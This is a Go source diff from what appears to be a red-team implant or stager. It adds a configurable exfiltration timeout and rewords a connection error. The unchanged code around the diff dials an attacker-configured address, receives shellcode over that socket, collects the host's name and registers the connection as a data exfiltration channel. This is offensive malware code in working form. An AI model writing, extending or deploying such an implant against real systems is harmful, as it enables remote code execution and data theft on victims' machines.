@@ -8,13 +8,15 @@ import (
 	"log"
 	"net"
 	"os"
+	"time"
 )
 
 var (
 	// set during compilation/linking via -X ldflag
-	address  string
-	network  string
-	exfilCfg string
+	address      string
+	network      string
+	exfilCfg     string
+	exfilTimeout string
 )
 
 func receiveShellcode(conn net.Conn) ([]byte, error) {
@@ -42,7 +44,15 @@ func receiveShellcode(conn net.Conn) ([]byte, error) {
 }
 
 func main() {
-	w, errs := exfilwriter.New(exfilCfg)
+	timeout := 3 * time.Second
+	if exfilTimeout != "" {
+		dt, err := time.ParseDuration(exfilTimeout)
+		if err == nil {
+			timeout = dt
+		}
+	}
+
+	w, errs := exfilwriter.New(exfilCfg, timeout)
 	hostname, err := os.Hostname()
 	if err != nil {
 		hostname = "unknown"
@@ -51,7 +61,7 @@ func main() {
 
 	conn, err := net.Dial(network, address)
 	if err != nil {
-		log.Fatalf("could not connect to %s: %s\n", address, err)
+		log.Fatalf("connecting to %s: %s\n", address, err)
 	}
 
 	w.AddExfiltrator(conn)
